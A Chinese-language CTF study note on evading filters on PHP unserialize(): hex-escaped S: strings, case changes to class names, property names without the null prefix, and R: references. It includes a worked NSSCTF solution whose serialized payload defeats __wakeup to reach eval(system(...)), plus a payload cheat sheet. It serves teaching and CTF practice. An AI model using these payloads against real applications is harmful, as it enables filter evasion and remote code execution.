## 一句话概括

`unserialize()` 的解析器**比格式规范本身宽容得多**：类型标记有大小写两种写法、字符串内容可以走十六进制转义、类名不区分大小写、甚至属性名不写 `\0` 前缀也能被认出来。凡是被 WAF / 正则以「固定特征串」拦住的场景，都能从这些宽容的缝隙里钻过去。

## 原理

### 1. 一句话抓住共性

这些绕过的共同思路是：**正则按「字面特征」匹配，PHP 按「语法」解析**。只要让字面特征被破坏、而语法依然合法，正则就白写了。这和 SQL 注入里 `/**/` 打断关键字是同一类技巧。

### 2. 细节一：大写 `S` 让内容按十六进制解析

PHP 序列化的字符串类型**有两种标记**：

```text
s:长度:"字符串内容"      // 普通字符串，内容按字面解析
S:长度:"字符串内容"      // 内容支持十六进制转义
```

- 小写 `s`：内容原样；
- 大写 `S`：内容里形如 `\xx` 的两字符会被当成**两位十六进制**还原成字节。

**绕过机制**：假设 WAF 拦关键词 `Object`：

```php
if (preg_match('/Object/i', $serialized)) { die('Filtered!'); }
```

| 写法 | 结果 |
|---|---|
| `s:13:"SplFileObject"` | 含 `Object` → 被拦 |
| `S:13:"SplFileOb\6aect"` | 字面上没有 `Object` → 放行；PHP 解析后仍是 `SplFileObject` |

解析过程：

```text
\6a  →  十六进制 0x6a  →  ASCII 字符 j
" SplFileOb\6aect "  →  "SplFileObject"   ✅
```

**常用字符编码表**（`\xx` 不区分大小写，`\6a` 与 `\6A` 等效）：

| 转义 | 字符 | 转义 | 字符 |
|---|---|---|---|
| `\6a` | `j` | `\63` | `c` |
| `\6f` | `o` | `\74` | `t` |
| `\62` | `b` | `\65` | `e` |
| `\73` | `s` | `\79` | `y` |
| `\6d` | `m` | | |

**另一个用例**：函数名 `system` 被拦时：

```text
被拦：s:6:"system"
绕过：S:6:"\73\79\73\74\65\6d"     // system
```

**关键约束**：长度字段 `s:6:` 数的是**转义还原后的字节数**（`system` = 6），不是转义串的字面长度（读作 24 个字符）。这一点和普通字符串完全一致 —— 长度永远描述「解析结果」。

### 3. 细节二：属性名可以只写「原名字」

**标准写法**：

```text
O:4:"Test":3:{
    s:6:"public";s:6:"public";
    s:11:"\0*\0protected";s:9:"protected";      // protected
    s:16:"\0Test\0private";s:7:"private";       // private
}
```

传统认知是「必须带 `%00`」，但**实测解析器是宽容的**。

在 PHP 8.3 上实测（同一份 payload，看 `protected` / `private` 属性有没有被真正改掉）：

| 写法 | 结果 |
|---|---|
| `s:7:"\0*\0prot"`（标准） | ✅ 属性被正确赋值 |
| `s:4:"prot"`（**纯名字，不加 `\0`、不加 `*`**） | ✅ 属性同样被正确赋值 |
| `s:5:"*prot"`（只加 `*`、不加 `\0`） | ❌ **不生效** —— 只是多出一个名字叫 `*prot` 的动态属性 |
| `s:6:"\0*prot"`（`\0` 数量不对） | ❌ 直接解析失败 |

也就是说：**「完全不加前缀」可以，「只加 `*` 不加 `\0`」不行**。

**利用场景**：当 WAF 过滤了 `%00` 字符时：

```text
传统方式（可能被过滤）：
O:4:"Test":1:{s:11:"%00*%00protected";s:9:"payload";}

绕过方式（实测可行）：
O:4:"Test":1:{s:9:"protected";s:9:"payload";}         // 直接写属性名
```

> **务必注意**：这是**解析器的宽容行为**，跨版本可能不同。**稳妥做法永远写标准的 `\0*\0名字` / `\0类名\0名字`**；只有当题目把 `%00` 过滤掉、且没法用别的路子时才拿它当备选。另外注意上表第二行「纯名字」虽然能赋值，但**属性名长度要按纯名字算**（`protected` 就是 9 字节，不是标准的 11）。

### 4. 细节三：类名不区分大小写

PHP 的类名本身不区分大小写，反序列化时也一样：

```text
O:1:"A":2:{s:1:"c";s:2:"11";s:1:"b";s:2:"22";}
等效于
O:1:"a":2:{s:1:"c";s:2:"11";s:1:"b";s:2:"22";}
```

实测确认：声明类 `A`，用 `O:1:"a":...` 反序列化，得到的仍然是 `A` 的对象。

**利用价值**：如果某处校验写成了大小写敏感的正则（比如 `preg_match('/O:\d+:"Admin"/', $x)` 且没加 `/i`），把 `Admin` 改成 `admin` 就能绕过；反过来，题面给的都是小写类名时也可以试大写。

### 5. 细节四：引用 `R:` / `r:`

序列化里可以表达**引用关系**，这是「绕过 `__wakeup` 重置属性」的一把利器。

```php
<?php
class test { public $a; public $b; public $c; }
$h = new test();
$h->b = &$h->a;          // b 成为 a 的引用
echo serialize($h);
// O:4:"test":3:{s:1:"a";N;s:1:"b";R:2;s:1:"c";N;}
?>
```

`R:2` 的含义是「引用序列化流中的**第 2 个值**」。编号规则：

- **从 1 开始**计数；
- 计的是**所有值**（包括类名占的那个位置）；
- 顺序就是序列化字符串的解析顺序。

对本例：

| 序号 | 内容 | 说明 |
|---|---|---|
| 1 | `"test"` | 类名 |
| **2** | `N` | **`a` 的值 ← 这就是 `R:2` 的目标** |
| 3 | `R:2` | `b` 的值 |
| 4 | `s:1:"c"` 的值 | |

所以 `b` 成了 `a` 的引用 —— **后续改 `b` 就是改 `a`**。实测验证：

```php
$o = unserialize('O:1:"R":3:{s:1:"a";N;s:1:"b";R:2;s:1:"c";s:3:"sys";}');
$o->a = 'CHANGED';
var_dump($o->b);      // string(7) "CHANGED"
```

`r:` 是「对象引用」变体（引用到另一个对象而不是值），用法相近，出现频率低一些。

### 6. 反序列化绕过手法对照表

| 拦住你的是 | 绕过手法 | 写法 | 版本 / 前提 |
|---|---|---|---|
| 正则 `/O:\d+:/` | 数字前加 `+` | `O:+4:"Demo":...` | PHP 7.x（8.x 已拒绝） |
| 正则拦关键词（`Object` / `system`…） | 大写 `S` + 十六进制转义 | `S:13:"SplFileOb\6aect"`、`S:6:"\73\79\73\74\65\6d"` | 通用 |
| WAF 拦 `%00` | 属性名只写原名字 | `s:9:"protected";` | 实测 PHP 8.3 可行，跨版本需试 |
| 大小写敏感的正则 | 改类名大小写 | `O:1:"a":...` ≡ `O:1:"A":...` | 通用 |
| `__wakeup` 重置属性 | 属性个数写大 | `O:4:"Demo":2:{...只给 1 个属性...}` | CVE-2016-7124，仅老版本 |
| `__wakeup` 重置属性 | 改用 `C:` 形式 | `C:类名长度:"类名":数据长度:{自定义数据}` | 类需实现 `Serializable` |
| `__wakeup` 重置属性 | 引用 `&` → `R:n` | `s:1:"b";R:2;` | 通用 |
| `__wakeup` 重置属性 | 类里定义 `__unserialize()` | —— | PHP 7.4+ |
| 长度/边界校验 | 字符逃逸 | 见 06 篇 | 通用 |

（`__wakeup` 的四种绕法详见 07 篇；`__unserialize` 顶替的完整例子见 13 篇。）

## 本题情景与解题手法

> 原笔记「引用」一节给出的判例（NSSCTF 简单例题）。

### 题目形态

```php
<?php
show_source(__FILE__);
###very___so___easy!!!!
class test{
    public $a;
    public $b;
    public $c;
    public function __construct(){
        $this->a = 1;
        $this->b = 2;
        $this->c = 3;
    }
    public function __wakeup(){
        $this->a = '';                 // ★ 防线：把 a 清空
    }
    public function __destruct(){
        $this->b = $this->c;           // ★ 中间跳：把 c 赋给 b
        eval($this->a);                // ★ 出口：eval(a)
    }
}

$a = $_GET['a'];
if (!preg_match('/test":3/i', $a)) {
    die("你输入的不正确！！！搞什么！！");   // ★ 防线：正则锁属性个数
}
$bbb = unserialize($_GET['a']);
?>
```

### 第一步：找出口，确认「要执行的代码只与 `$a` 有关」

`__destruct()` 最后是 `eval($this->a)`。**只要 `$a` 是命令串，就完成代码执行。**

### 第二步：认清两道防线

| 防线 | 内容 | 想干的事 |
|---|---|---|
| `__wakeup()` | `$this->a = '';` | 把攻击者想塞的命令**清掉** |
| 正则 `/test":3/i` | 要求 payload 里出现 `test":3` | **锁死属性个数为 3**，堵住「改属性个数绕过 `__wakeup`」的老套路 |

两条一起看：**命令不能直接放在 `$a` 里**（会被清空），而且**不能靠改个数让 `__wakeup` 不跑**（正则卡着）。

### 第三步：找被忽略的一句话 —— `$this->b = $this->c;`

`__destruct()` 里还有一句 `$this->b = $this->c;`。如果 **`$b` 是 `$a` 的引用**，那么这句「给 `b` 赋值」就等价于**给 `a` 赋值**：

```text
$b =& $a
__wakeup  : a=''          → b 也是 ''（一起被清）
__destruct: b = c         → a 也变成 c 的值（命令串回来了）
          : eval(a)       → 命令执行 ✅
```

**关键点**：`__wakeup` 清空 `a` 的时候，`b` 也被清了；但 `__destruct` 后面又把 `c` 写进 `b`，于是 `a` 又被填上了命令。**清空被后面的赋值抵消了。**

### 第四步：构造 payload

```php
<?php
class test {
    public $a;
    public $b;
    public $c = 'system("cat /fffffffffflagafag");';
}

$h = new test();
$h->b = &$h->a;      // ★ 取「会改变的那个属性」的地址赋给 b
echo '?a=' . serialize($h);
?>
```

输出：

```text
?a=O:4:"test":3:{s:1:"a";N;s:1:"b";R:2;s:1:"c";s:33:"system("cat /fffffffffflagafag");";}
```

逐项核对：

| 项 | 值 | 说明 |
|---|---|---|
| 正则 `/test":3/i` | `O:4:"test":3:` 命中 | 属性个数还是 3，**过正则** ✓ |
| `s:1:"a";N;` | `a = null` | `__wakeup` 清空后也是空，没影响 |
| `s:1:"b";R:2;` | `b` 引用第 2 个值（即 `a`） | **本手法核心** |
| `s:33:"..."` | 命令串 | `system("cat /fffffffffflagafag");` 正好 **33** 字节 ✓ |

### 注入手法一句话总结

> **`$b` 是 `$a` 的引用（`R:2`）** → `__wakeup` 清空 `a` 没用，因为 `__destruct` 里 `$this->b = $this->c` 会把命令重新写回 `a` → `eval($this->a)` 执行 → 用「引用」既绕过了 `__wakeup`，又没动属性个数（过正则）。

## 利用条件

1. **有可绕的固定特征串**：正则在拦 `O:数字:` / 关键词 / `%00` / 大小写 —— 特征越死越好绕；
2. **授权绕过需要「语义等价」**：`S:` 的十六进制还原后要与非转义的原文一致；类名改大小写后要指向同一个类；
3. **引用绕过需要一条「赋值通路」**：像例题那样，`__destruct` 里存在「给引用属性赋值」的语句，才能把被清空的值补回来；
4. **属性名宽容写法要挑版本**：`%00` 省略不是所有版本都行，稳妥仍是写标准形式。

## Payload 速查

| 目的 | 写法 |
|---|---|
| 十六进制绕关键词 | `S:6:"\73\79\73\74\65\6d"`（= `system`） |
| 原样字符串（对照） | `s:6:"system"` |
| 类名改大小写 | `O:4:"tEst":...`（仍指向 `test` 类） |
| 属性名省略 `\0` | `s:9:"protected";`（长度按纯名字算） |
| 引用（值引用） | `s:1:"b";R:2;` |
| 引用（对象引用） | `r:3;`（指向第 3 个对象） |
| 绕 `O:数字:` 正则 | `O:+4:"Demo":...`（见 07 篇） |

## 踩坑与备注

- **长度一律描述「解析结果」**。`S:6:"\73\79\73\74\65\6d"` 里长度是 **6**（`system`），不是转义串的 24 个字符 —— 这是大写 `S` 最容易错的地方。
- **`*prot` 这种「只加 `*` 不加 `\0`」的写法不生效**（实测会变成一个名为 `*prot` 的动态属性）。原笔记的表格里把它和「纯名字」并列成两种可用写法，**实测只有「纯名字」成立**；本文已按实测结论修正。
- **属性名省略前缀是「宽容行为」，不是规范**。跨 PHP 版本可能不同，且省略后**长度要按纯名字重新算**，别沿用标准写法的 11 / 16。
- **`R:` 的编号从 1 开始、且把类名也算进去**。写错一位就指向别的值，容易得到「看起来没报错但没生效」的结果 —— 最好的办法是用 `$obj->x = &$obj->y;` 让 PHP 帮你生成。
- **`r:` 与 `R:` 不同**：`R:` 引用「值」，`r:` 引用「对象」；题目里出现哪个取决于序列化时的实际结构。
- **`+` 号与大写 `S` 的可用性都和版本相关**：本机 PHP 8.3 实测 `O:+4:` 已被拒绝，而 `S:`、类名大小写、纯名字属性名、`R:` 引用均正常。判断能否用之前，先确认目标 PHP 版本。
- 原笔记这几节（`十六进制编码`、`格式差异`、`php类名不区分大小写`、`引用`）都是结论式的短笔记，缺少推导；本文已补齐机制说明，并用 PHP 8.3 实测结果替换/修正了其中不确定的表述。
